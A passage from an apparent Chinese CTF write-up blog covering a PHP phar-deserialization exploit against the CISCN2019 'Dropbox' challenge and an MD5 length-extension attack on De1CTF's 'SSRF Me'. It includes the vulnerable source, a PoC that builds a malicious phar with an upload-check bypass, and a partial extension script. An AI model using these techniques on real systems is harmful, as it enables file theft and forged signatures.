<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;db-&gt;close();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;    <span class="hljs-keyword">private</span> $files;    <span class="hljs-keyword">private</span> $results;    <span class="hljs-keyword">private</span> $funcs;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$path</span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;files = <span class="hljs-keyword">array</span>();        <span class="hljs-keyword">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();        <span class="hljs-keyword">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();        $filenames = scandir($path);        $key = array_search(<span class="hljs-string">&quot;.&quot;</span>, $filenames);        <span class="hljs-keyword">unset</span>($filenames[$key]);        $key = array_search(<span class="hljs-string">&quot;..&quot;</span>, $filenames);        <span class="hljs-keyword">unset</span>($filenames[$key]);        <span class="hljs-keyword">foreach</span> ($filenames <span class="hljs-keyword">as</span> $filename) &#123;            $file = <span class="hljs-keyword">new</span> File();            $file-&gt;open($path . $filename);            array_push(<span class="hljs-keyword">$this</span>-&gt;files, $file);            <span class="hljs-keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="hljs-keyword">array</span>();        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$func, $args</span>) </span>&#123;        array_push(<span class="hljs-keyword">$this</span>-&gt;funcs, $func);        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;files <span class="hljs-keyword">as</span> $file) &#123;            <span class="hljs-keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        $table = <span class="hljs-string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;        $table .= <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> $func) &#123;            $table .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities($func) . <span class="hljs-string">&#x27;&lt;/th&gt;&#x27;</span>;        &#125;        $table .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;        $table .= <span class="hljs-string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;results <span class="hljs-keyword">as</span> $filename =&gt; $result) &#123;            $table .= <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;            <span class="hljs-keyword">foreach</span> ($result <span class="hljs-keyword">as</span> $func =&gt; $value) &#123;                $table .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities($value) . <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;            &#125;            $table .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . htmlentities($filename) . <span class="hljs-string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;            $table .= <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span>;        &#125;        <span class="hljs-keyword">echo</span> $table;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;    <span class="hljs-keyword">public</span> $filename;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params">$filename</span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;filename = $filename;        <span class="hljs-keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">return</span> basename(<span class="hljs-keyword">$this</span>-&gt;filename);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">size</span>(<span class="hljs-params"></span>) </span>&#123;        $size = filesize(<span class="hljs-keyword">$this</span>-&gt;filename);        $units = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27; B&#x27;</span>, <span class="hljs-string">&#x27; KB&#x27;</span>, <span class="hljs-string">&#x27; MB&#x27;</span>, <span class="hljs-string">&#x27; GB&#x27;</span>, <span class="hljs-string">&#x27; TB&#x27;</span>);        <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $size &gt;= <span class="hljs-number">1024</span> &amp;&amp; $i &lt; <span class="hljs-number">4</span>; $i++) $size /= <span class="hljs-number">1024</span>;        <span class="hljs-keyword">return</span> round($size, <span class="hljs-number">2</span>).$units[$i];    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detele</span>(<span class="hljs-params"></span>) </span>&#123;        unlink(<span class="hljs-keyword">$this</span>-&gt;filename);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">return</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p><code>class.php</code>中定义了三个类：<code>User，Filelist，File</code><br>User类中除了三个用户处理函数外，在结束对象时会自动执行<code>__destruct</code>函数调用<code>close()</code></p><p><img src="/2021/05/18/dropbox/2.jpg" alt="2"></p><p>Filelist类中存在一个特别的魔术方法，__call()</p><blockquote><p>PHP5 的对象新增了一个专用方法 __call()，这个方法用来监视一个对象中的其它方法。当调用一个对象中不存在或被权限控制中的方法，__call 方法将会被自动调用。该函数会把不可调用的名作为第一个参数，方法作为第二个参数传入__call方法中执行</p></blockquote><p><img src="/2021/05/18/dropbox/3.jpg" alt="3"></p><p>遍历files数组，对每一个file变量执行一次$func，然后将结果存进$results数组。 最后结束时调用_destruct打印出$result和$func的信息.</p><p><img src="/2021/05/18/dropbox/4.jpg" alt="4"></p><p>File类中定义了一个和User类中的同名函数close()，直接获取文件内容</p><p><img src="/2021/05/18/dropbox/5.jpg" alt="5"></p><p>这个函数和Users中最后db调用的close()同名，File和Filelist中没有db变量，因此当db是FileList对象的一个变量时，User对象就会调用<code>__destruct</code>。<br>接着destruct函数触发FileList的close()，然而Filelist中没有close方法，因此<code>__call()</code>函数被调用，close()函数被传入__call执行。<br>Filelist对象销毁时，最后的<code>__destruct</code>函数就会自动执行，从而打印出<code>__call</code>中传入的$result和$func的信息，这就可以打印出flag的值.</p><p>poc:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;    <span class="hljs-keyword">public</span> $db;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;    <span class="hljs-keyword">public</span> $filename;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;    <span class="hljs-keyword">private</span> $files;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        $file = <span class="hljs-keyword">new</span> File();        $file-&gt;filename = <span class="hljs-string">&quot;/flag.txt&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;files = <span class="hljs-keyword">array</span>($file);    &#125;&#125;$a = <span class="hljs-keyword">new</span> User();$a-&gt;db = <span class="hljs-keyword">new</span> FileList();$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span>$phar-&gt;startBuffering();$phar-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span>$o = <span class="hljs-keyword">new</span> User();$o-&gt;db = <span class="hljs-keyword">new</span> FileList();$phar-&gt;setMetadata($a); <span class="hljs-comment">//将自定义的meta-data存入manifest</span>$phar-&gt;addFromString(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><span class="hljs-comment">//签名自动计算</span>$phar-&gt;stopBuffering();<span class="hljs-meta">?&gt;</span></code></pre><p>将生成的phar文件上传,抓包改文件类型绕过文件类型检测，然后在delete.php里面读取phar得到flag</p><h4 id="TIP1：在delete-php中利用payload，而不是download-php"><a class="header-anchor" href="#TIP1：在delete-php中利用payload，而不是download-php">🍭</a>TIP1：在delete.php中利用payload，而不是download.php</h4><p><img src="/2021/05/18/dropbox/6.jpg" alt="6"></p><p><code>open_basedir</code></p><p><code>in_set</code>函数是用来完成php的一些配置，其中就包括open_basedir ，用来限制当前程序可以访问的目录。它是可以访问设置目录下的所有下级目录。<code>open_basedir = /dir/user</code>, 那么目录 <code>/dir/user</code> 和 <code>/dir/other</code>都是可以访问的。所以如果要将访问限制在仅为指定的目录，需要用斜线结束路径名。”.&quot;可代表当前目录，<code>open_basedir</code>也可以同时设置多个目录,在Windows中用分号分隔目录,在任何其它系统中用冒号分隔目录。</p><p>本例：<code>ini_set(“open_basedir”, getcwd() . “:/etc:/tmp”); </code>就是只可以访问当前目录(getcwd()返回当前目录)、/etc和/tmp三个目录。</p><h4 id="TIP2：phar"><a class="header-anchor" href="#TIP2：phar">🍭</a>TIP2：phar</h4><p>详见：<a href="https://xz.aliyun.com/t/2715">phar://</a></p><p>把一个序列化的对象，储存在phar格式的文件中，<strong>生成后</strong>即使我们把格式给改了，也不影响它的作用：用一些文件包含函数，若以<code>phar://</code>协议去访问这个文件，那么就可以把那个对象给反序列化。<br>php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，受影响的函数如下：<br><img src="/2021/05/18/dropbox/1.png" alt="1"></p><p>参考：<a href="https://blog.csdn.net/qq_43756333/article/details/106503047">审计练习10——[CISCN2019 华北赛区 Day1 Web1]Dropbox</a></p><p><a href="https://blog.csdn.net/weixin_44077544/article/details/102844554">[CISCN2019 华北赛区 Day1 Web1]Dropbox</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hash Length Extension Attack</title>
    <link href="/2021/05/05/hash/"/>
    <url>/2021/05/05/hash/</url>
    
    <content type="html"><![CDATA[<p>新知识点MD5hash长度扩展攻击借[De1CTF 2019]SSRF Me记录一下。</p><p>源码：</p><pre><code class="hljs ruby"><span class="hljs-comment">#! /usr/bin/env python</span><span class="hljs-comment">#encoding=utf-8</span>from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)app = Flask(__name_<span class="hljs-number">_</span>)secert_key = os.urandom(<span class="hljs-number">16</span>)<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Task</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, action, param, sign, ip)</span></span><span class="hljs-symbol">:</span>        <span class="hljs-keyword">self</span>.action = action        <span class="hljs-keyword">self</span>.param = param        <span class="hljs-keyword">self</span>.sign = sign        <span class="hljs-keyword">self</span>.sandbox = md5(ip)        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-keyword">self</span>.sandbox)):          <span class="hljs-comment">#SandBox For Remote_Addr</span>            os.mkdir(<span class="hljs-keyword">self</span>.sandbox)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Exec</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>        result = &#123;&#125;        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">self</span>.checkSign())<span class="hljs-symbol">:</span>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">self</span>.<span class="hljs-symbol">action:</span>                tmpfile = open(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % <span class="hljs-keyword">self</span>.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)                resp = scan(<span class="hljs-keyword">self</span>.param)                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>)<span class="hljs-symbol">:</span>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp                <span class="hljs-symbol">else:</span>                    print resp                    tmpfile.write(resp)                    tmpfile.close()                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">self</span>.<span class="hljs-symbol">action:</span>                f = open(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % <span class="hljs-keyword">self</span>.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span><span class="hljs-symbol">:</span>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span>        <span class="hljs-symbol">else:</span>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span>        <span class="hljs-keyword">return</span> result    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkSign</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>        <span class="hljs-keyword">if</span> (getSign(<span class="hljs-keyword">self</span>.action, <span class="hljs-keyword">self</span>.param) == <span class="hljs-keyword">self</span>.sign)<span class="hljs-symbol">:</span>            <span class="hljs-keyword">return</span> True        <span class="hljs-symbol">else:</span>            <span class="hljs-keyword">return</span> False<span class="hljs-comment">#generate Sign For Action Scan.</span>@app.route(<span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">geneSign</span><span class="hljs-params">()</span></span><span class="hljs-symbol">:</span>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))    action = <span class="hljs-string">&quot;scan&quot;</span>    <span class="hljs-keyword">return</span> getSign(action, param)@app.route(<span class="hljs-string">&#x27;/De1ta&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>])<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">challenge</span><span class="hljs-params">()</span></span><span class="hljs-symbol">:</span>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))    ip = request.remote_addr    <span class="hljs-keyword">if</span>(waf(param))<span class="hljs-symbol">:</span>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span>    task = Task(action, param, sign, ip)    <span class="hljs-keyword">return</span> json.dumps(task.Exec())@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span></span><span class="hljs-symbol">:</span>    <span class="hljs-keyword">return</span> open(<span class="hljs-string">&quot;code.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).read()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scan</span><span class="hljs-params">(param)</span></span><span class="hljs-symbol">:</span>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)    <span class="hljs-symbol">try:</span>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[<span class="hljs-symbol">:</span><span class="hljs-number">50</span>]    <span class="hljs-symbol">except:</span>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getSign</span><span class="hljs-params">(action, param)</span></span><span class="hljs-symbol">:</span>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span><span class="hljs-params">(content)</span></span><span class="hljs-symbol">:</span>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span><span class="hljs-params">(param)</span></span><span class="hljs-symbol">:</span>    check=param.strip().lower()    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>)<span class="hljs-symbol">:</span>        <span class="hljs-keyword">return</span> True    <span class="hljs-symbol">else:</span>        <span class="hljs-keyword">return</span> False<span class="hljs-keyword">if</span> __name_<span class="hljs-number">_</span> == <span class="hljs-string">&#x27;__main__&#x27;</span><span class="hljs-symbol">:</span>    app.debug = False    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)</code></pre><h3 id="法一"><a class="header-anchor" href="#法一">🍭</a>法一</h3><p>flask框架，一共三个路由：</p><blockquote><p>index获取源码</p></blockquote><blockquote><p>geneSign调用了getSign方法生成 md5</p></blockquote><blockquote><p>De1ta获取了三个参数</p><blockquote><p><code>action = urllib.unquote(request.cookies.get(&quot;action&quot;))</code>//action是传入read和scan的<br><code>param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</code>//传入一个文件名<br><code>sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))</code>//sign是MD5值<br>Task中有个Exec()方法，里面还有个checkSign()，并且在这里面调用了getSign()方法，结果与sign进行比较，getSign()方法里有个secert_key，我们需要构造参数:第一个参数action应该包含read，第二个param参数应该是文件名，第三个参数的secert_key值我们不知道，所以不能自己加密，访问一下geneSign页面，并传入参数param=flag.txt得到一串MD5值：</p><p><img src="/2021/05/05/hash/1.jpg" alt="1"></p><p>源码<code>md5(secert_key + param + action)</code>里的action固定为csan，所以我们现在需要的是<code>md5(key+flag.txt+scanread/readscan)</code>我们现在得到了md5值，接着访问De1ta页面传入flag.txt即可</p><img src="/2021/05/05/hash/2.jpg" alt="2" style="zoom: 50%;"></blockquote></blockquote><h2 id="法二：MD5hash长度扩展攻击"><a class="header-anchor" href="#法二：MD5hash长度扩展攻击">🍭</a>法二：MD5hash长度扩展攻击</h2><h4 id="MD5算法"><a class="header-anchor" href="#MD5算法">🍭</a>MD5算法</h4><p><img src="/2021/05/05/hash/4.png" alt="4"></p><p>MD5算法分为两步：</p><ul><li>MD5 padding</li><li>MD5 compress</li></ul><h4 id="md5-padding"><a class="header-anchor" href="#md5-padding">🍭</a>md5 padding</h4><blockquote><p>如果输入信息的长度(字节)对64求余的结果不等于56，就需要填充使得对64求余的结果等于56。填充的方法是填充一个x80和xx个0。填充完后，信息的长度为N*64+56(字节)，并且最后8个字节用来记录原始输入信息长度</p></blockquote><p>如admin进行md5 padding的结果为：</p><pre><code class="hljs angelscript"><span class="hljs-number">61646</span>d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000</code></pre><p>即由以下几块组合<br><code>61646d696e</code> ：admin的hex<br><code>80</code>：填充的x80<br><code>50个00</code>：为了保证信息的长度为N*64+56(字节)<br><code>2800000000000000</code>：实际的值为<code>0000000000000028</code>，十进制的40，单位是bit，所以是5个字节(admin)</p><h3 id="Magic-number"><a class="header-anchor" href="#Magic-number">🍭</a>Magic number</h3><blockquote><p>代码中的<code>0x67452301L, 0xefcdab89L, 0x98badcfeL, 0x10325476L</code>这4个初始化的number就被称为Magic number或者是md5 iv(md5 向量)</p></blockquote><p>md5的算法概括：</p><blockquote><p>先进行消息长度的填充(padding)。填充完后，初始化的4个Magic number会和第一个64字节的Message block进行md5  compress压缩算法。压缩算法完成后，会产生新的4个Magic number。这样再进行第二个64字节Message block的md5  compress压缩算法。以此类推……直到压缩到最后64个字节的(<code>Message block</code> + padding)，最后得到的Magic number经过hex转化就是最后的md5 hash值</p></blockquote><p>admin：</p><p>md5经过padding后，由于只有64字节，所以只进行一轮md5 compress。压缩算法完成后，产生的新的Magic number为</p><pre><code class="hljs apache"><span class="hljs-attribute">A</span>=<span class="hljs-number">0</span>x<span class="hljs-number">292</span>f<span class="hljs-number">2321</span>L<span class="hljs-attribute">B</span>=<span class="hljs-number">0</span>xa<span class="hljs-number">7</span>a<span class="hljs-number">5577</span>aL<span class="hljs-attribute">C</span>=<span class="hljs-number">0</span>xe<span class="hljs-number">4</span>a<span class="hljs-number">8943</span>L<span class="hljs-attribute">D</span>=<span class="hljs-number">0</span>xc<span class="hljs-number">31</span>f<span class="hljs-number">804</span>aL</code></pre><p>md5的加密结果是<code>21232f297a57a5a743894a0e4a801fc3</code>，我们将A大小端逆序一下，变成21232F29，刚好是md5的前8位。</p><p>已知：</p><ul><li>md5(salt+message)的值</li><li>message内容</li><li>salt+message长度</li></ul><p>MD5长度扩展攻击就是在不知道salt的具体内容的情况下，计算出任意的md5(salt+message+padding+append)值。因为在进行<code>md5(salt+message+padding+m')</code>的时候，在对m’进行padding之前的Message block，和<code>md5(salt+message)</code>产成的Message block一样。所以，我们就能在salt未知的情况下，只需根据<code>md5(salt+message)</code>的结果，逆向出最后一次的4个Magic number。</p><p>逆向算法：</p><pre><code class="hljs apache"><span class="hljs-attribute">def</span> compute_magic_number(self, md<span class="hljs-number">5</span>str):    <span class="hljs-attribute">self</span>.A = struct.unpack(<span class="hljs-string">&quot;I&quot;</span>, md<span class="hljs-number">5</span>str[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>].decode(&#x27;hex&#x27;))[<span class="hljs-number">0</span>]    <span class="hljs-attribute">self</span>.B = struct.unpack(<span class="hljs-string">&quot;I&quot;</span>, md<span class="hljs-number">5</span>str[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>].decode(&#x27;hex&#x27;))[<span class="hljs-number">0</span>]    <span class="hljs-attribute">self</span>.C = struct.unpack(<span class="hljs-string">&quot;I&quot;</span>, md<span class="hljs-number">5</span>str[<span class="hljs-number">16</span>:<span class="hljs-number">24</span>].decode(&#x27;hex&#x27;))[<span class="hljs-number">0</span>]    <span class="hljs-attribute">self</span>.D = struct.unpack(<span class="hljs-string">&quot;I&quot;</span>, md<span class="hljs-number">5</span>str[<span class="hljs-number">24</span>:<span class="hljs-number">32</span>].decode(&#x27;hex&#x27;))[<span class="hljs-number">0</span>]</code></pre><p>根据这4个Magci number，再和扩展的字符串<code>m'</code>(此时的m’要进行padding，padding的长度是<code>len(salt+message+padding+m')</code>)进行md5 compress，最后的结果即<code>md5(salt+message+padding+m')</code>，m’表示要扩展的字符串，padding表示对salt+message长度进行padding后的结果。</p><h4 id="实例："><a class="header-anchor" href="#实例：">🍭</a>实例：</h4><p>已知salt的长度为4，message为admin，md5(salt+message)的值为c7813629f22b6a7d28a08041db3e80a9，想扩展的字符串m’为<code>joychou</code>，计算<code>md5(salt+message+padding+m')</code>的值，padding表示对salt+message长度进行padding后的结果</p><p>c7813629f22b6a7d28a08041db3e80a9逆向出magic number为：</p><pre><code class="hljs apache"><span class="hljs-attribute">A</span>=<span class="hljs-number">0</span>x<span class="hljs-number">292</span>f<span class="hljs-number">2321</span>L<span class="hljs-attribute">B</span>=<span class="hljs-number">0</span>xa<span class="hljs-number">7</span>a<span class="hljs-number">5577</span>aL<span class="hljs-attribute">C</span>=<span class="hljs-number">0</span>xe<span class="hljs-number">4</span>a<span class="hljs-number">8943</span>L<span class="hljs-attribute">D</span>=<span class="hljs-number">0</span>xc<span class="hljs-number">31</span>f<span class="hljs-number">804</span>aL</code></pre><p>先对m’进行padding，padding结果用<code>padding(m')</code></p><pre><code class="hljs angelscript"><span class="hljs-number">800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003802000000000000</span></code></pre><p>长度57个字节，注意最后8个字节0x238为<code>len(salt+message+padding+m')</code>，即568bit，71字节</p><p>再用这4个magic  number对m’产生的Message block进行md5 compress，最后结果为06cf5a94dcda53659f58c0f411ba0bd8</p><p>为了证明和验证想法，我们正向去进行md5加密，看看padding的过程。此时需要知道salt，salt为<code>meme</code></p><p>原始的urlencode后字符串为</p><pre><code class="hljs angelscript">memeadmin%<span class="hljs-number">80</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>H%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>joychou</code></pre><p>代码：</p><pre><code class="hljs python">str = unquote(<span class="hljs-string">&quot;memeadmin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00H%00%00%00%00%00%00%00joychou&quot;</span>)m = md5py.md5()<span class="hljs-keyword">print</span> m.my_md5(str)</code></pre><p>进行padding后</p><pre><code class="hljs angelscript"><span class="hljs-number">6</span>d656d6561646d696e800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000048000000000000006a6f7963686f75800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003802000000000000</code></pre><p>可以发现，其实只对joychou进行了padding。而且前64字节产生的magic number正是c7813629f22b6a7d28a08041db3e80a9算出来的。</p><p><a href="https://github.com/JoyChou93/md5-extension-attack">md5长度扩展攻击代码脚本</a>：</p><pre><code class="hljs apache"><span class="hljs-comment"># coding:utf-8</span><span class="hljs-attribute">import</span> md<span class="hljs-number">5</span>py<span class="hljs-attribute">import</span> sys<span class="hljs-attribute">from</span> urllib import unquote<span class="hljs-attribute">import</span> hashlib<span class="hljs-attribute">import</span> struct<span class="hljs-attribute">import</span> urllib<span class="hljs-attribute">def</span> payload(length, str_append):    <span class="hljs-attribute">pad</span> = &#x27;&#x27;    <span class="hljs-attribute">n0</span> = ((<span class="hljs-number">56</span> - (length + <span class="hljs-number">1</span>) % <span class="hljs-number">64</span>) % <span class="hljs-number">64</span>)    <span class="hljs-attribute">pad</span> += &#x27;\x<span class="hljs-number">80</span>&#x27;     <span class="hljs-attribute">pad</span> += &#x27;\x<span class="hljs-number">00</span>&#x27;*n<span class="hljs-number">0</span> + struct.pack(&#x27;Q&#x27;, length*<span 